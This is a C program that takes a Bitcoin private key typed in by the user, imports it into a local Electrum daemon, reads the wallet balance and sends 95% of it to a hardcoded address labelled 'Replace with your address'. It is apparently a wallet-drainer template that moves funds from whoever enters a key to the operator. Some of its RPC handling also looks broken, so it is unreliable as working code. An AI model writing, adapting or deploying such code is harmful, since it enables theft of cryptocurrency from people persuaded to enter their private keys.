#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <json-c/json.h>

#define MY_ADDRESS "3989LYRH3bauPigYs8HSTAg8kGGNHtvgjF" // Replace with your address
#define PERCENTAGE 0.95

void start_electrum_daemon()
{
    system("electrum daemon -d");
    sleep(2);
    system("electrum daemon setconfig rpcport 7777");
    system("electrum daemon load_wallet");
    sleep(1);
}

struct Response
{
    char *data;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct Response *resp = (struct Response *)userp;
    char *ptr = realloc(resp->data, resp->size + realsize + 1);
    resp->data = ptr;
    memcpy(&(resp->data[resp->size]), contents, realsize);
    resp->size += realsize;
    resp->data[resp->size] = 0;
    return realsize;
}

double get_balance(CURL *curl)
{
    struct Response resp = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    char json[512] = "{\"id\":\"1\",\"method\":\"getbalance\",\"params\":[]}";

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

    curl_easy_perform(curl);

    struct json_object *parsed_json = json_tokener_parse(resp.data);
    struct json_object *result;
    json_object_object_get_ex(parsed_json, "result", &result);
    double balance = json_object_get_double(result);

    free(resp.data);
    curl_slist_free_all(headers);
    json_object_put(parsed_json);

    return balance;
}

void make_transfer(CURL *curl, const char *amount)
{
    struct Response resp = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    char json[512];
    snprintf(json, sizeof(json),
             "{\"id\":\"1\",\"method\":\"payto\",\"params\":[\"%s\", \"%s\"]}",
             MY_ADDRESS, amount);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK)
    {
        printf("Transfer response: %s\n", resp.data);
    }

    free(resp.data);
    curl_slist_free_all(headers);
}

int main()
{
    start_electrum_daemon();

    CURL *curl;
    char private_key[100];

    printf("Enter private key: ");
    fgets(private_key, sizeof(private_key), stdin);
    private_key[strcspn(private_key, "\n")] = 0;

    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:7777");

        // Import private key
        struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
        char json[512];
        snprintf(json, sizeof(json),
                 "{\"id\":\"1\",\"method\":\"importprivkey\",\"params\":[\"%s\"]}",
                 private_key);

        struct Response resp = {0};
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK)
        {
            double balance = get_balance(curl);
            char amount[20];
            snprintf(amount, sizeof(amount), "%.8f", balance * PERCENTAGE);
            make_transfer(curl, amount);
        }

        curl_easy_cleanup(curl);
    }
    return 0;
}
